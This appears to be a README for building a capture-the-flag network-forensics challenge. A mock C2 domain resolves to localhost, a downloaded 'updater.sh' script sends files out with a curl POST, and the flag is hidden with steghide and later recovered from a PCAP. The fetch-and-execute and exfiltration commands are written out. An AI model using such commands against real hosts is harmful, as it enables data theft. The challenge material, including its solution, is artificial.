# Local "Deployment" Steps
1) Edit your `/etc/hosts` file and add this line: `127.0.0.1    twodollarstooexpensive.store`. `twodollarstooexpensive.store` was a fun fake C2 front that I made during some workshop with friends, where you can get ANYTHING under 2 DOLLARS (including claude code for a limited time!)
2) Begin a Wireshark capture process.
3) Run `pip install uploadserver`; an extended version of Python's `http.server` but with file upload features.
4) For the directory where `updater.sh` is, start a Python HTTP server: `python3 -m uploadserver -d <directory of updater.sh>`.
5) Run `curl http://twodollarstooexpensive.store/updater.sh --output updater.sh`, `chmod +x updater.sh`, then execute `updater.sh`. The script will automatically collect data and send it off back to the web server using `curl` commands. E.g. `curl -X POST http://twodollarstooexpensive.store/upload -F 'files=@<file1>' -F 'files=@<file2>'`.
6) Once the script is done, stop the Wireshark capture process and save the PCAP file!

The target file is an image file named `passwordispassword.jpg`, with the flag encrypted with DES embedded in it. A `passwords.txt` file has the Key and IV for the decryption. Simple enough. The script will upload both files to the server, which are recoverable in Wireshark!

The commands for sealing the data and extracting are:
- `steghide embed -ef <file w/ encrypted pw> -cf passwordispassword.jpg -p password`
- `steghide extract -xf recoveredPassword -sf <JPG file of extracted image bytes from upload packet> -p password`

From there, the challenge is pretty straightforward!
- Recovered password from image is in `recoveredPassword`.
- Extracted image data is in `extractImage.jpg`.
- Extracted password data is in `extractedPasswords.txt`.
- The PCAP of this challenge is in `capture.pcapng`.
